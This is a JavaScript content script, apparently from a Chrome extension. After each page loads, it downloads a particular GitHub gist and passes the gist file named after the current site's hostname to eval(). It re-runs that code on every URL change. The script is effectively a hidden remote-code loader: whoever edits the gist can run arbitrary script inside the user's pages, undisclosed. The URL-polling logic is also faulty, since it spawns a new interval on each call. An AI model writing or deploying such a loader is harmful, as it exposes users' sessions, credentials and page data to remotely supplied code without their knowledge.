function gistScript() {
    let siteUrl = 'https://api.github.com/gists/1d920ec4314bb3e0fbca48e851443c5d';
    let host = location.hostname;
    let fullUrl = window.location.href;
    let responseLast;
    let oldURL = "";

    function load() {
        $.ajax({
            url: siteUrl,
            async: false,
            dataType: 'json',
            success: function (response) {
                execute(response);
            }
        });
    }

    function execute(response) {
        if(response != undefined){
            responseLast = response;
        }
        if(responseLast != undefined){
            if (responseLast['files'][host]) {
                // console.log('+eval' + responseLast['files'][host]);
                eval(responseLast['files'][host]['content']);
            }
        }

    }

    load();

    function checkURLchange(currentURL){
        if(currentURL != oldURL){
            // console.log('+new url');
            execute();
            oldURL = currentURL;
        }
        oldURL = window.location.href;
        setInterval(function() {
            checkURLchange(window.location.href);
        }, 1000);
    }

    checkURLchange();

}

chrome.extension.sendMessage({}, function (response) {
    var readyStateCheckInterval = setInterval(function () {
        if (document.readyState === "complete") {
            clearInterval(readyStateCheckInterval);
            gistScript();
        }
    }, 0);
});